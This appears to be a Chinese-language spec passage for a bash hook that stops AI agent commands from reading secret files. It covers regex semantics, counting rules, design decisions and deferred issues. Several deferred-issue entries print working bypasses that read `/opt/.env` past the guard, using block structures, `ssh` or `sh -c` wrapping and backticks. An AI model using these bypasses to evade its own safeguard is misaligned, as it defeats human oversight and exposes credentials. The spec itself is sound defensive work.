> **`53/17/2` 与其余四组不同 schema, 并列即误导 (owner 2026-08-09 采 R5 tech-lead R5-M-3 B-8)**: 其余四组都是「含边界总数 / 拦 / 放行」且**后两项相加等于第一项** (52+16=68 · 53+19=72 · 49+16=65, 三组自洽); `53/17/2` 的 17+2=19≠53 ⇒ 它数的不是同一组量。本版保留该条目**只作为「口径混乱到什么程度」的史料**, **不得**把它当作与另四组同轴的第五个候选值参与任何比较或取舍。

**定案 65/49/16/15/1 + 5** (作者权威计数器与 R2 qa 双独立扫描器交叉确认, R2 tech-lead / code-reviewer 亦复现一致)。计数器随 spec 交付 (`corpus_census.py`), 口径与 §2 规则表同源: quote-aware, 顶层 `;` `&&` `||` `|`, 换行单列。

> **⚠️ 第六次计数争议已经发生, 对象是 13 处 credit 判据 —— 故该口径一并写进计数器 (R5 code-reviewer m-1 + R5 aggregated 补记)**
>
> 「13 处判据里多少处受换行影响」在四个来源里出了**三个数**: v5 写 11 · R5 tech-lead 数出 12 · R5-fix 执笔者数出 13。逐条排查后**没有人算错** —— 差异全部来自**基线怎么写** (`criterion.sh` 机械对拍):
>
> | 基线写法 | 受影响判据 | 注入点 |
> |----------|-----------|--------|
> | **严格**: `[[:space:]]*` 位置**不写**那个可选空格 (`cat x >/dev/null`) | **11 / 13** | 23 |
> | **宽松**: 同一命令**写出**可选空格 (`cat x > /dev/null`) | **13 / 13** | 25 |
>
> 两种写法都是合法 bash, 差别只在可选空格在不在。**这就是「数法未固化」在第二个统计对象上的原样复发**, 所以处置也一样: 固化进计数器, 不靠人复述。
>
> **`corpus_census.py` 须额外输出 (随 spec 交付, SC-18 机械比对)**:
>
> 1. 13 处判据的**行号清单**, 断言恰 **13** 条 —— 现值 `342 347 358 361 364 368 372 375 383 386 390 394 397`。抽取规则以下面这条**已实跑**的命令为准 (区间取 `# ── Filter detection` 与 `# ── Risky read patterns` 两条 banner 之间, 实测 `318..401`):
>
>    ```bash
>    SRC=aria/hooks/secret-guard.sh
>    s=$(grep -n 'Filter detection'   "$SRC" | head -1 | cut -d: -f1)
>    e=$(grep -n 'Risky read patterns' "$SRC" | head -1 | cut -d: -f1)
>    awk -v s="$s" -v e="$e" 'NR>s && NR<e && /^if echo "\$command" \| grep -qE/ {print NR}' "$SRC"
>    ```
>
> 2. 字面口径三个数: 用 `[[:space:]]+` 的 **10** 处 / 用 `[[:space:]]*` 的 **12** 处 / 含 `[[:space:]]` (任意量词) 的 **13** 处;
> 3. **换行影响面须同时报两个基线口径的数** (`严格 11/13` 与 `宽松 13/13`), 并在输出里注明基线字符串本身 —— 只报一个数就是把这次争议留给下一轮。
>
> 上述数字全部由 R5-fix 执笔者从 canonical 机械抽取后复算, **未采信任何审计报告里的转述**。**本版之后, 凡 spec 正文引用「13 处判据的任一统计」, 必须是计数器的输出, 不得手数。**
>
> 附带后果: 采逐行内建 helper 后, 13 处判据**一律**走同一 helper, "受影响的是哪几处"不再是任何 Task 或 SC 的输入 —— 这个数从**载荷**降为**说明**。这是本条修法的第二重价值: 不只把口径固化, 还把它从关键路径上拿掉。

> **⚠️ 原型正则不可逐字搬运 (R3 backend M-2 → **R4 code-reviewer C-1 事实勘正**)**: 作者原型用 Python 正则。前一版写「含 `(?:…)` / `\b` / `\s` —— bash 的 POSIX ERE **全不支持**」—— **三者中两个是错的**。
>
> R4 三方独立实测 (code-reviewer / backend-architect / 主 loop, bash 5.2.15 + glibc) 一致:
>
> | 语法 | bash `[[ =~ ]]` | 证据 |
> |------|----------------|------|
> | `(?:…)` 非捕获组 | ❌ **rc=2 编译失败** | `[[ ab =~ (?:a)b ]]` → rc=2 |
> | `\b` 词边界 | ✅ **支持** (GNU 扩展) | `\bbar\b` 命中 `foo bar`、不命中 `foobar` (证明真生效非当字面 `b`) |
> | `\s` / `\w` | ✅ **支持** (GNU 扩展) | `a\sb` 命中 `a b`; `\w+` 命中 `abc` |
>
> **被审代码自己就是活反例**: `secret-guard.sh` 的匹配循环用的正是 `[[ "$command" =~ $pat ]]`, 而 141 条 pattern 里 **16 条含 `\b`** (`\bpg_dump\b` / `vault[[:space:]]+agent\b` 等), 测试 **366/366 全绿**。若不支持, 这些早该静默失配。
>
> 错误来源: R3 backend M-2 把三个语法捆在**同一条正则**里测 (`'(?:for|while)\s'` 一次 rc=2), 把 `(?:` 的编译失败**归因给了全部三个**; v4 忠实继承该归因错误 —— memory `feedback_spec_inherits_upstream_dec_errors` (忠实 ≠ 正确) 与 `feedback_never_write_unverified_impossibility_claims` 的合流形态。
>
> **修正后的实现约束**: (1) `(?:…)` 必须去掉 (真编译失败); (2) `\b` / `\s` / `\w` **允许保留** —— 它们是 glibc GNU 扩展、本 hook 已在生产使用, 但须在 SC-16 记为「已知 GNU 依赖」, 非 glibc 平台 (macOS / BSD / musl) 的行为差异**归转出 9**; (3) **不得**把 `\b` 机械改写成 `([^a-zA-Z]|$)` 之类 —— 语义真的会变 (`\b` 视 `_` 与数字为词内字符, 字符类不视), 而 13 处 credit 里恰有 2 处含 `\b` (`grep[[:space:]]+(-v|--invert-match)\b` / `(sha256sum|md5sum|sha1sum|sha512sum)\b`)。
>
> **为什么 R4 当时把这条定 Critical (历史陈述 —— 该死结现已解开, owner 2026-08-09 采 R5 tech-lead R5-M-3 D-1 改显式时态)**: 在 **R4 时的旧 SC-16** 里写着「正则不得含 `\b`」, 它与 SC-15 (语义不变) 在**必然发生的输入**上互斥 —— 逐字保留则旧 SC-16 不过, 改写则 SC-15 不过或在其 26 条视野外静默改变拦截面。Rule #10 下 Phase B 两条闸门都不能自行豁免, 而当时的 spec 没给裁定, 故定 Critical。
>
> **⇒ 现状: 该互斥已不存在**。本版 SC-16 已按 R4 的事实勘正重写为「`\b` / `\s` / `\w` 允许保留, 记为已知 GNU 依赖」, 与 SC-15 不再冲突。读到上一段请勿理解为死结仍在。
>
> **另**: SC-16 是**语法层**检查 (能否编译), 结构上抓不到「编译通过但语义窄」的错误 —— R4 backend-architect CRITICAL-2 的裸 `^` 正是此类。两者互补, 不可相互替代。
>
> **另**: 验证脚本若经 `sed` 等就地编辑, **必须重读确认正则未被破坏后才可采信结果** —— 本 cycle v2 原型被 `sed` 写坏正则后仍输出"全绿", 作者干净重写才发现。
>
> **跨版本搬运纪律 (R4-M-1)**: 从上一轮报告搬运的实测数字, **必须在新规则下重跑**后才可写入 —— v4 的 `&` 已成降级标记, R3 在 v3 规则下测的「由 0 翻 2」在 v4 下不复成立。

### Key Deliverables

> 位置说明 (owner 2026-08-09 采 R5 tech-lead R5-M-3 B-11): 本小节原插在 §5 与 §6 之间, 打断了 §1→§6 的编号连续性, 已移到 §6 之后、`## 关键决策` 之前 —— 它是对 §1–§6 全部机制的产物汇总, 放在编号段落**结束之后**才符合它的角色。

- `aria/hooks/secret-guard.sh` — `safe_to_split()` + `split_top()` + **`_sg_line_match()` 逐行 helper** + 判定循环重排 + BLOCKED 消息补段落 (见转出 10 — tech-lead m-4b)
- `aria/hooks/tests/secret-guard.test.sh` — 分段器单元测试 + fail-safe 降级族 + credit 多行正负双向族 + 端到端族 + `KNOWN-LIMIT` 转正
- **`aria/hooks/tests/corpus_census.py`** (新增, 随 spec 归档) — 语料统计**与 13 处 credit 判据统计**的**权威计数器**, 见 §6

## 关键决策

| 决策 | 选择 | 理由 |
|------|------|------|
| **实现手段** (owner 2026-08-09 补, R5 tech-lead R5-M-3 B-3 — 五轮反复撞 shell 语法边界, 该选择此前从未显式记录) | **手写 bash 扫描 (字符/token 级), 不引入外部 shell 解析器** | 三条理由: (1) **零依赖**是本 hook 的硬约束 —— 它跑在每次 PreToolUse 上, 引入 `bashlex` / `shfmt` / `tree-sitter-bash` 等于给每次工具调用加一个进程与一份安装面, 与 §What.4 刚花整轮根治的 fork 成本背道而驰; (2) 真解析器改变的是**覆盖率上界**而非本版目标 —— 转出 2 (需块结构解析) / 转出 3 (需嵌套 shell 解析) / 转出 8 (需真正的 shell 语法解析) 三条的出路**指向同一类**「完整 shell 语法解析」能力; 转出 5 (`$()` / 反引号 / heredoc 内部欠拦) 虽未显式写出路陈述, 但性质相同 (同样需要解析嵌套结构才能安全处理) (措辞勘正 tech-lead m-6 —— 前一版写「四条的出路都写着『需真正的shell语法解析』」不实, 只有转出 8 字面如此, 已改为准确归因), 那是**另一个 spec 的范围**, 本版明确只做「可安全分段」子集并 fail-safe 降级其余; (3) 代价已知且已计价 —— `safe_to_split()` 是启发式、判据类别不封闭 (R3-C-2), 残余误报归转出 8。**若未来要翻这个决定, 入口是转出 2/8 而非本 spec** |
| **块结构** | **fail-safe 降级到整命令判定** (**启发式, 不保证穷尽**) | v2 的「切了再说」实测 5/5 误报; 但判据类别**不封闭** (R3-C-2: `exec` 类无标记仍需降级) ⇒ 承诺强度下调, 残余误报归转出 8 |
| 切分记号 | 顶层 `;` `&&` `\|\|` | `&`/换行各有实测反例; `\|\|` 排除会留一字符绕过 |
| 管道 | 不切 | 12 条 pattern 把 `\|` 编码进正则 |
| 判定顺序 | **先 pattern 后 credit** | **布尔等价, 且该等价与 credit 的实现方式无关** —— 只依赖「credit 是该段的纯函数」这一条: `(∃pat: seg =~ pat) ∧ ¬credit(seg)` 与 `¬credit(seg) ∧ (∃pat: seg =~ pat)` 恒等。逐行 helper 是对同一只读字符串的无副作用判定, 纯函数性质不变 ⇒ 等价成立。**前一版挂的「R3 tech-lead 306 条 0 不一致」实证是对 grep 版 credit 做的, credit 实现本版已换, 论证链前提已变** (结论仍对), 故改为实现无关的代数论证 —— 这样 credit 再改一次也不失效 |
| quote-aware | 必须 | 理由是**语义正确性** (切出不完整片段), 非「防安全回归」(R1 已证伪) |
| `has_filter` 13 处 subprocess | **重构为 bash 内建** (owner 2026-08-04 裁定) | 重排只在 benign 负载有效, 最坏负载 (= spec 自己推荐的迁移写法) +583%; 根治后性能不再依赖负载分布 |
| **内建化的换行语义** | **逐行 helper `_sg_line_match()`** (owner 2026-08-09 采候选 A) | 三个候选里**唯一实测与 canonical 零分歧**的解 (0/143 对抗 · 0/23 探针 · 0/11 端到端 · 0/305 语料), 由两席独立殊途同归; 段级守卫治一半造出更宽的 fail-close (13/13 判据), `${BASH_REMATCH[0]}` 变体仍在尾随换行形态上分歧。性能相对现状 fork 版 **−94.8%**, SC-8 不受影响 |
| 数字口径 | 交付权威计数器, **覆盖语料面 + 13 处判据面** | 语料面同一统计已被五次尝试给出结果, 其中一次 schema 不同 (§6); 判据面第六次已发生 (11/12/13 三个数, 根因是基线写法而非算错) ⇒ 两个统计对象同样处置。SC-18 断言计数器自身 |
| `guard:ack` | 命令级 | 段级会把已 ack 的复合命令由 0 变 2 (R2 实测); SC-12 锁定 |

## Impact

- 影响面: `secret-guard.sh` (降级检测 + 分段 + 判定重排 + 消息) + 测试 + 新增计数器。零 skill / 零 schema / 零跨仓。
- **覆盖率 (诚实声明)**: 仅修复**可安全分段**的复合命令。含块结构者 (`{ }` / `for…done` / `$()` / 反引号 / heredoc …) **维持现状泄漏** —— 非本版引入, 归转出 1/2/5。
- **迁移面 (口径见 §6)**: 305 条 `bash_case` 中 65 条含顶层边界记号 (49 拦 / 16 放行, 其中 15 纯管道 + **1** 真边界即 `KNOWN-LIMIT` 用例), 另 5 条纯换行边界 (4 拦 + `#152 FP: multiline benign` 放行) 因不切换行而零影响。
- 版本: PATCH → **v1.65.6** (SOT 现 1.65.5; **bump 前 re-check**, Aria#170 已撞过一次并发) — Task 1.10a (tech-lead m-5 补回指)。
- **行为变更 (穷尽声明)**: **只有一类** —— 可安全分段的 `a; b` / `a && b` / `a || b` 形态将开始被拦。CHANGELOG 须标注 + 给迁移写法 (逐段补 redirect) — Tasks 1.6 + SC-10。
  - **credit 重构 (Task 1.3b) 是零行为变更的**: 采逐行内建 helper 后, credit 判定与 canonical 在 305 条语料 + 23 条 credit 探针 + 11 条端到端探针 + 13 正则 × 11 对抗串上**全部 0 分歧** (§What.4 实测表)。这是候选 A 相对另两个候选的**关键差别**: v5 的段级守卫会让「无关换行 + 单行完整 filter」这类常见多行命令由放行翻成拦截 —— 一个**没有申报也没有迁移写法**的行为变更, 且 `a; b` 类记号一个都没有 (R5 code-reviewer C-1)。本版取消该翻转, 故行为变更面**仍只有上面那一条**。
  - 反过来说: Phase B 若在 credit 面观察到**任何**与 canonical 的差异, 那就是实现 bug, **不是设计内的预期翻转** —— 这一条使 SC-15 成为无稀释信号的黄金验收 (见 SC-15 反事实)。
- ship 同步面: aria 子模块 3 交付文件 + 5 版本文件 + 主仓 gitlink。**不含** `.claude/scripts/` (已于主仓 `5fab5b8` 移除)。
  - **⚠️ 主仓侧按「版本引用点」而非「文件数」枚举 —— 文件数口径正是 [Aria#177](https://forgejo.10cg.pub/10CG/Aria/issues/177) 判定的类级根因**。v4 只写「VERSION + README badge」漏了 12 点; v5 补了 5 点仍漏 7 点, 且自称的「至少 6 个」与自己枚举的 5 个对不上 (R5 knowledge-manager M-1 + R5 code-reviewer m-2)。本版**不再报「漏了几个」这种相对数**, 直接给全量绝对清单 —— 相对数每改一次就要重算一次, 是上一轮出错的直接机制。
  - **主仓 14 个引用点全量表** (R5-fix 执笔者 2026-08-09 实读 `grep -n "1\.65\.5"` 逐个核对; 与 Aria#177 正文独立列出的 14 点**逐点吻合**):

    | 文件 | 行 | 形态 |
    |------|----|------|
    | `CLAUDE.md` | `:139` | 方法论轨版本区间末端 `v1.52.0–v1.65.5 已 ship` |
    | `CLAUDE.md` | `:141` | 项目状态段「版本:」行 |
    | `README.md` | `:8` | shields badge |
    | `README.md` | `:242` | `Plugin Version:` 独立行 (**与 badge 不是同一字符串**) |
    | `README.zh.md` / `.ja.md` / `.ko.md` | 各 `:3` | `<!-- translated-from: vX.Y.Z -->` 标记 |
    | `README.zh.md` / `.ja.md` / `.ko.md` | 各 `:10` | shields badge |
    | `README.zh.md` / `.ja.md` / `.ko.md` | 各 `:244` | `Plugin Version:` 独立行 |
    | `VERSION` | 子模块版本表 | `\| aria (插件) \| v1.65.5 \|` |

    合计 2 + 2 + 3×3 + 1 = **14**。i18n 的 **badge 与版本行无条件随版本号同步**; #140 B 档「仅正文实质变更才重译」只约束**正文重译**, 不豁免版本号同步 (R5 knowledge-manager m-1 指出原短语二义)。
  - **不得以 custom check 全绿代替逐点核对**: Aria#177 已实测 `m6-version-badge-match` 只比 `README.md` 的 badge、`i18n-readme-translation-currency` 只比 `translated-from` 标记 ⇒ 上表 14 点中 **7 点** (README.md:242 + 3 个 i18n 的 badge 与版本行) 残留旧版本时两条 check **仍全绿**。CLAUDE.md 两点则**无任何 check 兜底**。Task 1.11 承接。
- **验收环境** (⚠️ **2026-08-08 前提刷新** —— 原表述基于一条**现已不成立**的事实): 全部 SC 以 **canonical `aria/hooks/secret-guard.sh` 直调**为准。**原理由已失效**: [Aria#172](https://forgejo.10cg.pub/10CG/Aria/issues/172) 已修复并关闭 (2026-08-08), 本仓 plugin cache 现为 **1.65.5**, `cmp` 判定与 canonical **字节相同** ⇒ harness hook 链跑的就是 canonical 那份, 不再失真。**保留 canonical 直调作为 SC 标准的新理由**: 它不依赖 harness/plugin 安装态, 判据可在任意环境复算 —— 这是可复现性选择, 不再是被迫降级。
  > **✅ 该设计问题已由 R4 裁定 (措辞见 rule6_note 的校正 —— 五席一致的是「不应整体换成纯 harness 链」这个较弱命题, 「拆两腿」这个具体机制 qa-engineer 持不同方案)**: 提问是「既然 harness 链已可信, SC-9 是否应改走 harness hook 链」。**结论: 不二选一, 拆两腿** —— SC-9a canonical 直调作 pre-merge 主闸, SC-9b harness 链作 ship 后投递面验证。五席论据互补: canonical 直调**结构上证明不了「用户真的会被拦住」** (Aria#172 的教训正是 canonical 一直对、用户加载的是错的); 但 harness 链有**时序矛盾** (qa: pre-merge 闸验的是 PR 里的代码, 不是已部署的 cache), 且 tech-lead 实测 harness 链在 Phase B 阶段**结构上跑不到**本 spec 的改动。规范层的一般化归 [Aria#178](https://forgejo.10cg.pub/10CG/Aria/issues/178), 本 spec 是其单点应用。
- 文档回填: `secret-hygiene.md` 自测计数 (现 366) — Tasks 1.7 + **SC-13** (R2 knowledge M-1: 上版只落 Task 无 SC)。
- 归档 spec **不回写** (本仓先例: 归档是「实际 ship 了什么」的历史记录); `2026-08-02-secret-guard-nomad-var-put-echo/` 的 `KNOWN-LIMIT` 表述失效仅在本 spec 与 CHANGELOG 记录。

## 转出 (ship 时逐条开 issue; **复现命令内联**, R2 knowledge M-2: 不得只引用未提交的审计报告)

1. **[架构, 高]** 跨段 pattern fail-open — `set -o posix; set | grep foo` (2→0); `set -o posix && set | grep buildid` 同。工作面 = **1 条 `.*` + 81 条含 `[^|]` 的 pattern** 待逐条裁定 (其中 `[^|]*` **79** 条 / `[^|]+` **7** 条 / 两者兼有 **5** 条; 数组共 **141** 条 pattern)。

   > **口径勘正 (owner 2026-08-09 采 R5 tech-lead R5-M-3 B-4, 连续三轮未改)**: 前三版写「81 条 `[^|]*`」—— 把**任意量词**的数 (81) 配了**星号**的记号 (真值 79), 是第七次计数争议的种子。本版三个数由机械扫描定案, 并按 §6 纪律**纳入 `corpus_census.py`** (Task 1.4 + SC-18), 此后不得手数。
   >
   > 扫描口径 (已实跑, 与 §6 的 13 处判据抽取同源): 取 `risky_patterns=(` 到其闭合 `)` 之间**以单引号或双引号起始**的行 —— **单引号 139 + 双引号 2 = 141**。⚠️ 只数单引号行会得 139 (漏两条 `ssh…` 双引号 pattern), 从而把三个数各少算 2, 得出错误的 `79/77/7`。
   >
   > **这是 `141 → 139` 第二次发生**: 头部「被实测推翻的作者断言」第 (6) 条记的正是「R1→R2 重写时把已核实的 141 改成 139」。同一个数、同一个差额 2、同一个根因 (漏数双引号行) —— 裁定本条时的机械扫描第一遍也踩了它。⇒ 这不是谁粗心, 是**抽取规则没固化**, 故本版把它写进 `corpus_census.py` 而非只在正文改数。
2. **[缺陷, 高]** 块结构内的泄漏 — 本版降级为现状, 未修复。复现: `{ cat /opt/.env; echo x; } >/dev/null` / `for f in a b; do cat /opt/.env; done >/dev/null` / `( cat /opt/.env; echo x ) >/dev/null` 均 exit=0。需块结构解析。
3. **[缺陷, 中]** `ssh host '…'` / `sh -c '…'` 外壳逃逸 — 复现: `ssh h 'cat /opt/.env; true >/dev/null'` exit=0, 含 Aria#170 形态的 ssh 版。需嵌套 shell 解析。
4. **[缺陷, 中]** `&` / 换行 两个切分记号 — `&` 与 `&>` `>&` `|&` `2>&1` 冲突 (复现: `cat /opt/.env &>/dev/null` 若切 `&` 则由 0 翻 2); 换行切碎 heredoc (复现: `cat <<EOF\nsecret\nEOF\nnomad var get x`)。
5. **[缺陷, 中]** `$(…)` / 反引号 / heredoc 内部的欠拦 — 本版降级为现状。复现: `` x=`cat /opt/.env; true >/dev/null` `` exit=0。
6. ~~**[性能]** `has_filter` 13 处转 bash 内建~~ — **已于 2026-08-04 由 owner 裁定拉回本 spec 范围** (见 §What.4), 不再转出。
7. ~~**[运维, 中]** [Aria#172](https://forgejo.10cg.pub/10CG/Aria/issues/172) plugin cache 陈旧致仓内 dogfood 失真~~ — **已修复并关闭 2026-08-08**, 不再转出。根因是两层滞后 (marketplace clone 停在 `da15d0f` 自称 1.63.0 ⇒ Claude Code 认为已最新 ⇒ cache 永不更新); 机械兜底 = 主仓 `71bdd60` 的 `plugin-cache-currency` state-check。**衍生转出**: [Aria#178](https://forgejo.10cg.pub/10CG/Aria/issues/178) — hook 类 SC 须显式声明测的是 canonical 直调还是 harness hook 链 (同版本下两条路径语义仍不同, 探针管不到)。
8. **[缺陷, 中]** fail-safe 判据**不封闭**的残余误报面 (R3-C-2) — 无块结构标记但仍不可安全分段的形态。已知实例: `exec >/dev/null; nomad var get x` (0→2)。根治需真正的 shell 语法解析; 本版只能枚举已知类。**新形态出现时应扩充 §What.1 判据表而非视为 SC 失败**。
9. **[可移植性, 低] (R4 code-reviewer C-1 衍生)** 本 hook 的正则依赖 glibc 的 GNU regex 扩展 (`\b` / `\s` / `\w`) —— 141 条 pattern 里 16 条含 `\b`, 13 处 credit 判据里 2 处含 `\b`。非 glibc 平台 (macOS 自带 bash 3.2 / BSD / musl-Alpine) 的行为未验证, 词边界可能被当字面字符 ⇒ 静默失配。

   **复现 (⚠️ 正则必须先存进变量, 再以不加引号的形式代入 `=~`)**:

   ```bash
   re='\bbar\b'
   [[ "foobar"  =~ $re ]] && echo MATCH || echo NOMATCH   # glibc 实测: NOMATCH
   [[ "foo bar" =~ $re ]] && echo MATCH || echo NOMATCH   # glibc 实测: MATCH
   # 两者结果相同 (同 MATCH 或同 NOMATCH) = 该平台不支持 \b
   ```

   **不得**写成 `[[ "foobar" =~ \bbar\b ]]` —— 裸写时反斜杠在 quote removal 阶段就被剥掉 (`printf '%s\n' \bbar\b` 输出 `bbarb`), 正则引擎根本没看到 `\b`, 于是**在已证实支持 `\b` 的 glibc 机器上也判「两者相同 = 失配」**, 是一条自证伪命令 (v5 原文即此形态, R5 knowledge-manager C-2 发现, R5-fix 执笔者实跑复核属实)。加双引号 (`=~ "\bbar\b"`) 同样错 —— 引号会强制字面匹配。此坑纯属 shell 词法, 与平台正则库无关; 对 `secret-guard.sh` 里写在双引号字符串**字面量内**的 `"…\\b…"` 不构成影响。本 spec 不处理, 仅立案。memory `feedback_sot_example_commands_are_never_executed` 点名的正是这一形态: **规范判据对 ≠ 示例可执行**。

10. **[安全, 中] (R5 tech-lead R5-M-3 B-2 → owner 2026-08-09 改判: 归因错位, 转出立案, 本 spec 不修)** BLOCKED 回显把**整条命令**送进 chat-visible 通道, 命令行内联真值时即触 Rule #7。

    **原提法与其错处**: 审计席提的是「§What.5 要求 BLOCKED 消息指出触发段落, 而段落原文可能是 secret 载体」。风险成立, **但归因给了本 spec**。实测: canonical `secret-guard.sh:691` 现在就有 `Command was: $command`, 而**段落是整条命令的子串** ⇒ 本 spec 的「补段落」**不新增此前未暴露的信息** (行号勘正 + 措辞勘正 tech-lead m-4a, backend-architect 复核: 原写「增加零个新字节」不成立 —— Task 1.3 明写「BLOCKED 消息补段落」, 输出确实多一行, 字节数并非零; 成立的命题是「段落内容早已包含在既有的 `Command was: $command` 整条回显里, 不构成新增的信息暴露面」)。真实暴露面比审计席描述的更大 (整条 > 段落), 且**先于本 spec 存在**。

    **未来脱敏该暴露面时的范围提醒**: 若日后有人修复本转出 (脱敏 BLOCKED 回显), 脱敏范围须**同时覆盖** `Command was: $command` **与本 spec 新增的「触发段落」行**——两者都是同一条命令的子串, 只脱敏 `$command` 而漏了新增的段落行, 会让段落回显反而成为唯一未脱敏的残留泄漏面 (tech-lead m-4c)。

    **复现 (假值, 不涉真 secret)**:

    ```bash
    printf '%s' '{"tool_name":"Bash","tool_input":{"command":"nomad var put secret/demo value=FAKE_PLACEHOLDER_NOT_A_SECRET_9x9"}}' \
      | bash aria/hooks/secret-guard.sh 2>&1 >/dev/null | tail -2
    # 实测输出末行: Command was: nomad var put secret/demo value=FAKE_PLACEHOLDER_NOT_A_SECRET_9x9   (exit 2)
    ```

    路径可达性已核: `nomad[[:space:]]+var[[:space:]]+put([[:space:]]|$)` 在 `risky_patterns` 内 (`:416`), 故「命令行内联真值 → 被拦 → 整条回显」是**今天就能走通**的链路。

    **为什么不在本 spec 修**: 脱敏回显是**行为变更**, 需自带验收面 (哪些片段脱敏 / 脱敏后 BLOCKED 消息还能不能定位问题 / 与 SC-1·SC-3 的 exit code 断言正交但要改测试期望)。本 spec 已因 `has_filter` 拉回扩过一次范围, 再扩即失控。

    **历史泄漏面已普查 (owner 2026-08-09 指示, 只出 metadata)**: 扫 909 份 transcript + 2 份 log, 去重后 **263 条 BLOCKED 回显**。两个独立模态交叉 —— (a) 5 条内联真值键名判据 (`value=` / `--password` / `Authorization:` 等) 命中 **3 处, 全部是本次复现探针的假值**; (b) 高熵串判据命中 33 处, 分刀后 **30 处是路径段**、2 处是同一探针假值、余 **1 处经字符类掩码定型为 UUID** (`=999999aa-a999-9aa9-a99a-99aa9a9aaaaa`, 在一条 `export` 命令里)。⇒ **未发现真实内联真值泄漏, 无需凭据轮换** (对照 memory `feedback_secret_in_logs_fix_requires_rotation`: 若曾泄漏, 代码脱敏不闭环)。判据为启发式不保证穷尽, 但两模态交叉后残余候选已归零。
    > 扫描器自身踩过一个坑, 记录以免重犯: 首版用 `Command was: (.*)` 在 JSONL 上取命令, `(.*)` 会吃掉**整条 JSON 记录的剩余部分**, 于是把 Anthropic 的 `toolu_` / `req_` ID 当成 188 个"高熵凭据"。必须 `json.loads` 后在**单个字符串值内部**定位并在其换行处终止。

11. **[实现, 低] (backend-architect 独立复核席 2026-08-09 发现, owner 同日裁定: `BLOCK_KW_RE` 本体不动, 单独立案与 `do`/`then`/`else`/`elif` 的同类问题一并处置)** §What.1 命令位置清单新补的 `!` 分支, 其左侧无边界约束 —— `;` / `&&` / `\|\|` / `&` 等既有位置 token 都是 shell 元字符, 不可能出现在裸词中间, 但 `!` 是普通字符, 可以是任意词的一部分, 导致该分支在**良性、未加引号或带引号**的命令上都可能误触发 (方向 fail-safe, 无安全后果: 只是把不该降级的命令多降级一次, 代价是性能而非漏拦)。

    **同类问题 `do` / `then` / `else` / `elif` 在 v6 (加 `!` 之前) 就已存在, 不是本次新引入的缺陷类别**——独立复核实测 (用 v6 的 `BLOCK_KW_RE`, 即无 `!` 分支的版本):

    ```bash
    nl=$'\n'
    OLD='(^|'"$nl"'|;|&&|\|\||\||&|do|then|else|elif|in)[[:space:]]*(for|while|until|if|case|select)\b'
    [[ "echo redo for-real" =~ $OLD ]] && echo MATCH || echo NOMATCH             # 实测: MATCH ("redo" 的 "do" 子串, v6 即如此)
    [[ "echo strengthen for a moment" =~ $OLD ]] && echo MATCH || echo NOMATCH   # 实测: MATCH ("strengthen" 的 "then" 子串, v6 即如此)
    ```

    两条命令均合法、良性, 在 v6 (未加 `!`) 下就已误触发降级——这是既有设计的子串邻接权衡, 方向安全, 一并归本转出而非拆两条单独立案。

    **`!` 的复现 (v7 新增行为, 本 spec 引入)**:

    ```bash
    nl=$'\n'
    NEW='(^|'"$nl"'|;|&&|\|\||\||&|!|do|then|else|elif)[[:space:]]*(for|while|until|if|case|select)\b'
    [[ "echo myapp!for-config" =~ $NEW ]]  && echo MATCH || echo NOMATCH   # 实测: MATCH (良性命令, 无风险内容)
    [[ "git log --grep=!for"   =~ $NEW ]]  && echo MATCH || echo NOMATCH   # 实测: MATCH
    [[ "echo '!if x'"          =~ $NEW ]]  && echo MATCH || echo NOMATCH   # 实测: MATCH (`!if` 落在单引号字面量内, 正则不解析引号故仍误触)
    ```

    **已验证的候选修法 (立案记录, 本 spec 不采纳)**: 把 `!` 从顶层 alternation 移到既有位置 token 之后的从属可选项 `!?`, 而非独立分支:

    ```bash
    FIX='(^|'"$nl"'|;|&&|\|\||\||&)[[:space:]]*!?[[:space:]]*(for|while|until|if|case|select)\b'
    ```

    实测: `! for f in a; do :; done` / `cmd; ! while true; do :; done` / `! if true; then :; fi` 三条真阳性**全部保留** (`FIX=1`); `echo myapp!for-config` / `echo '!if x'` / `git log --grep=!for` 三条假阳性**全部消除** (`FIX=0`)。

    **owner 2026-08-09 裁定不采**: (1) 超出本轮 13 条裁定的字面范围; (2) 已是同一条规范正则 `BLOCK_KW_RE` 第三次被动 (`in` 删除 / `!` 补入两次改动之后再改第三次), 而这条正则本身正是本 spec 全程「同一句散文两种读法产出两种实现」的高发点 (v4 的 `exec`/`time` 行、裸 `^`、`(^|\n)` 均出在此处); (3) 方向仍是 fail-safe, 不是安全缺陷; (4) `do`/`then`/`else`/`elif` 的同类问题在 v6 就已存在且从未处理, 与其现在只补 `!` 一处, 不如与既有四处一起立案一起治, 比零散改更稳。

## rule6_note

**Rule #6**: deterministic detector hook → structural fixture + unit-test corpus + dogfood (memory `feedback_deterministic_structural_skill_rule6_substitute`); 不走 `/skill-creator` AB (hook 非 capability skill)。框定与 owner 2026-08-02 对 `secret-guard-nomad-var-put-echo` 的裁定一致。

**substitute** (三组件逐一兑现, 与姊妹归档 spec `2026-08-02-secret-guard-nomad-var-put-echo/` 的 rule6_note 同构 — R5 knowledge-manager M-2):

| Rule #6 组件 | 本 spec 的兑现 |
|--------------|----------------|
| structural fixture | SC-1 (5 形态 baseline-failing) + SC-6 (fail-safe 降级族, 含 `case` 隔离单元断言) + SC-4 (quote-aware, 反事实可证伪) |
| unit-test corpus | SC-5 (分段器单元, 数组基数断言) + SC-2/SC-3 (迁移回归锁) + SC-11 (全量 366) + SC-15 (credit 语义不变, 正负双向) |
| **dogfood** | **SC-9a** (canonical 直调, pre-merge 主闸) —— v5 遗漏该组件, 清单只列两组件却在框定句里声明三组件 |

**dogfood 环境 (2026-08-08 前提刷新 + R4 裁定)**: 上一版写「因 Aria#172 仓内 harness 跑 1.63.0, 不可用『我在本仓被拦/放行』作 dogfood 证据」—— **该限制已解除**: #172 已修复关闭, 仓内 harness 现跑 1.65.5 (R5-fix 执笔者 `cmp` 复核: `~/.claude/plugins/cache/10CG-aria-plugin/aria/1.65.5/hooks/secret-guard.sh` 与 canonical **字节相同**; 另注意 `1.63.0/` 陈旧目录仍并存, 故 SC-9b 的 `cmp` 前置断言必须**指名版本目录**, 不能只说「plugin cache」)。**R4 五席裁定**: 拆 **SC-9a** (pre-merge 主闸) + **SC-9b** (harness 链, ship 后投递面), 理由见 SC-9b 条目。
> 措辞校正 (R5 qa-engineer m-1): 五席一致的是「**不应把 SC-9 整体替换为纯 harness 链**」这个较弱命题; 「是否需要新增一条独立 SC-9b」各席方案有别 (qa-engineer 倾向单条 SC + 复用既有 `plugin-cache-currency` state-check, 其余四席倾向新增独立验证腿), 本版采后者。**不得**再以「5/5 收敛」为由关闭对该机制操作面的讨论。

## Tasks

